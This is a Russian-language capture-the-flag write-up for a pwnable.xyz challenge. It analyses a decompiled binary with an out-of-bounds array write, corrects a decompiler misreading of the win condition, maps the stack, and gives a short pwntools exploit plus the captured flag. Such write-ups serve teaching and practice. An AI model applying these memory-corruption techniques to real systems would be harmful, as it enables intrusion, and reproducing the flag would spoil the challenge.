Try not using a debugger for this one.
svc.pwnable.xyz : 30003
Author: [uafio](https://pwnable.xyz/user/2/)
[download](https://pwnable.xyz/redisfiles/challenge_24.gz)

Исходный код:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 s; // [rsp+10h] [rbp-A0h] BYREF
  __int64 array[3]; // [rsp+18h] [rbp-98h]
  __int64 a; // [rsp+30h] [rbp-80h] BYREF
  __int64 b; // [rsp+38h] [rbp-78h] BYREF
  __int64 index; // [rsp+40h] [rbp-70h] BYREF
  unsigned __int64 canary; // [rsp+A8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setup(argc, argv, envp);
  memset(&s, 0, 0x98u);

  *(array + 7) = 3735928559LL;
  while ( _isoc99_scanf("%ld %ld %ld", &a, &b, &index) == 3 && index <= 9 && index >= -7 )
  {
    array[index + 6] = a + b;
    printf("Result: %ld\n", array[index + 6]);
  }
  if ( *(array + 7) == c )
    win();
}
```

Код с частью выигрыша декомпилирован не верно:
``` C
  if ( *(array + 7) == 0xB000000B5LL )
    win();
```
Вот его asm:
``` nasm
loc_AC6:
lea     rax, [rbp+s]
add     rax, 0Fh
mov     rdx, [rax]
mov     rax, 0B000000B5h
cmp     rdx, rax
jnz     short loc_AE8
```
Что фактически означает `*(&s+0x0F)`. Из-за чего при записи в `array[7]` числа `0xB000000B5` флаг не будет получен.

Стек и расчёт:
```
-00000000000000A0     __int64 s;
-0000000000000098     __int64 var_98;
-0000000000000090     __int64 var_90;
-0000000000000088     __int64 var_88;

s:        00 00 00 00 00 00 00 00
array[0]: 00 00 00 00 00 00 00 b5  <- s+15
array[1]: 00 00 00 0b 00 00 00 00
array[2]: 00 00 00 00 00 00 00 00
```

Эксплоит:
``` python
def add(io, index, num1, num2):
    payload = (f'{num1} {num2} {index}').encode()
    io.sendline(payload)
    
io = start()

add(io, 0-6, 0, u64(p64(0xb500000000000000), sign='signed'))
add(io, 1-6, 0, 0xb000000)

io.sendline(b'a') # выход

io.interactive()
```

Запуск:
![](../../../z.%20Images/{4E27B99E-1913-4744-8617-71D8D921F6A0}.png)

Ответ: `FLAG{u_cheater_used_a_debugger}`